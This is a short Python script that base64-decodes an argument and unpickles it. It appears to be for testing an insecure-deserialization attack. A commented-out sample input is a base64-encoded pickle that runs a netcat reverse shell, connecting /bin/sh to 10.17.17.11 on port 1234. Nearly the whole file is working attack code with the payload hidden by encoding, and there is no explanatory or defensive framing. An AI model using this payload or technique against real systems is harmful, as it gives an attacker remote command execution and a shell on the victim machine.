import pickle
from base64 import b64decode
import sys

data = bytes(sys.argv[1], 'utf-8')
#data = b"gASVaQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjE5ybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xNy4xNy4xMSAxMjM0ID4vdG1wL2aUhZRSlC4="
test = b64decode(data)
print(pickle.loads(test))
